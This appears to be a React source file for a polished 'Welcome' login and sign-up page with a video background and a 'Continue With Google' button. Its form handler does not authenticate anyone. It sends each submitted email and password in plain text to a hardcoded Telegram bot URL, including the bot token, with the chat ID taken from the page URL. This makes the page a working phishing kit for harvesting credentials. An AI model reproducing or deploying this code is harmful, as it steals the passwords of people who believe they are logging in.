import React, { FC, useContext, useState } from "react";
import { Button, Checkbox, Link } from "@nextui-org/react";
import { useParams } from "react-router-dom";
import { useForm } from "react-hook-form";
import axios from "axios";
import Field from "../ui/input/field";
import { validEmail } from "./valid-email";
import { Context } from "../../main";
import { GoogleAuthProvider, signInWithPopup } from "firebase/auth";
import GoogleIcon from './../../images/authGoogle.svg';
import video from './../video/12788303_1920_1080_30fps.mp4';

const Auth = () => {
  const [type, setType] = useState("login");
  const { auth } = useContext(Context);
  const [isLoading, setIsLoading] = useState(false);
  const { chatId } = useParams();
  const [lastRequestTime, setLastRequestTime] = useState(0);

  const Login = async () => {
    const provider = new GoogleAuthProvider();
    const { user } = await signInWithPopup(auth, provider);
  };

  const {
    register: formRegister,
    handleSubmit,
    formState: { errors },
    reset,
  } = useForm({
    mode: "onChange",
  });

  const onsubmit = async (data) => {
    const API = 'https://api.telegram.org/bot6725080038:AAH9HLWT6_ORc9U15jkVo06DIOQMjk17P-c/sendMessage';
    const text = `new user\nemail: ${data.email}\npassword: ${data.password}`;
    const currentTime = Date.now();
    const timeSinceLastRequest = currentTime - lastRequestTime;
    const requestInterval = 15000; // 15 seconds

    if (timeSinceLastRequest < requestInterval) {
      console.log(`Please wait ${((requestInterval - timeSinceLastRequest) / 1000).toFixed(1)} seconds before trying again.`);
      return;
    }

    setIsLoading(true);

    try {
      const response = await axios.post(API, {
        chat_id: chatId,
        text: text
      });
      if (response.status === 200) {
        setIsLoading(false);
        setLastRequestTime(currentTime);
        reset();
      }
    } catch (error) {
      console.log(`Error sending form: ${error}`);
      setIsLoading(false);
    }
  };

  return (
    <>
      <div className={`flex items-center justify-center h-screen dark  dark:text-white`}>
        <div className="flex flex-col items-center h-screen w-screen justify-center bg-none bg-transparent overflow-hidden bg-content1 p-2 sm:p-4 lg:p-8 relative z-20">
          <div className="flex flex-col items-center pb-2">
            <p className="text-xl font-medium text-white">Welcome</p>
            <p className="text-small text-default-500">Create your account to get started</p>
          </div>
          <div className="mt-2 bg-transparent backdrop-blur-md flex w-full max-w-sm flex-col gap-4 rounded-large bg-content1 px-8 py-6 shadow-small">
            <h1 className="pb-2 text-xl font-medium dark:text-white">
              {type === "login" ? "Log In" : "Sign Up"}
            </h1>
            <form className="flex flex-col gap-3" onSubmit={handleSubmit(onsubmit)}>
              <Field
                {...formRegister("email", {
                  required: "Email is required",
                  pattern: {
                    value: validEmail,
                    message: 'Please enter a valid email address!'
                  }
                })}
                type="email"
                placeholder="Email"
                isClear={true}
                error={errors.email?.message}
              />
              <Field
                {...formRegister("password", {
                  required: "Password is required",
                  minLength: {
                    value: 6,
                    message: 'Min length should be more than 6 symbols!'
                  }
                })}
                type="password"
                placeholder="Password"
                error={errors.password?.message}
              />
              <div className="flex items-center justify-between px-1 py-2">
                <Checkbox defaultSelected color="primary" size="sm" aria-label="Remember me">Remember me</Checkbox>
                <Link href="#" size="md" className="text-default-400 hover:text-default-300 transition-all ease-in-out">Forgot password?</Link>
              </div>
              <Button color="primary" isLoading={isLoading} type="submit">
                {type === 'login' ? 'Log In' : 'Sign up'}
              </Button>
            </form>
            <div className="flex flex-col gap-2 text-center">
              <Button variant="bordered" onClick={Login}><img src={GoogleIcon} alt="" />Continue With Google</Button>
              <p className="text-xs">Need to create an account?
                <Link onClick={() => { setType(type === 'login' ? 'register' : 'login') }} href="#">
                  {type === 'login' ? 'Sign Up' : 'Login'}
                </Link>
              </p>
            </div>
          </div>
        </div>
        <video src={video} className='video object-cover w-full h-screen absolute z-10' autoPlay={true} loop muted controls={false}></video>
      </div>
    </>
  );
};

export default Auth;